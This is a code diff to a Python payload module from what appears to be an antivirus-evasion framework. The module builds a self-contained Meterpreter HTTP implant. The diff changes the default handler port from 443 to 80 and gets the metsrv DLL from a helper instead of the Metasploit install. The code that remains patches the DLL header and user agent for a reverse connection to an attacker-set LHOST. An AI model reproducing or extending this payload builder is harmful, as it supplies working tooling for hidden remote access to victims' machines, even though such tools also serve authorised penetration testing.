@@ -33,7 +33,7 @@ class Payload:
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                  "inject_method" : ["virtual", "[virtual]alloc"],
                                  "LHOST" : ["", "IP of the metasploit handler"],
-                                 "LPORT" : ["443", "Port of the metasploit handler"]}
+                                 "LPORT" : ["80", "Port of the metasploit handler"]}
         
         
     # helper for the metasploit http checksum algorithm
@@ -55,26 +55,14 @@ class Payload:
             for char in r:
                 if self.checksum8(uri + char) == checkValue:
                     return uri + char
-                    
+
     def generate(self):
-        
-        if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"):
-            metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/1.9.1/gems/meterpreter_bins-0.0.10/meterpreter/metsrv.x86.dll"
-        else:
-            print "[*] Error: You either do not have the latest version of Metasploit or"
-            print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
-            print "[*] Error: Please fix either issue then select this payload again!"
-            sys.exit()
-            
-        f = open(metsrvPath, 'rb')
-        meterpreterDll = f.read()
-        f.close()
-        
+
         # lambda function used for patching the metsvc.dll
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
         # patch the metsrv.dll header
-        headerPatch = helpers.selfcontained_patch()
+        meterpreterDll, headerPatch = helpers.selfcontained_patch()
         meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
 
         # patch in the default user agent string
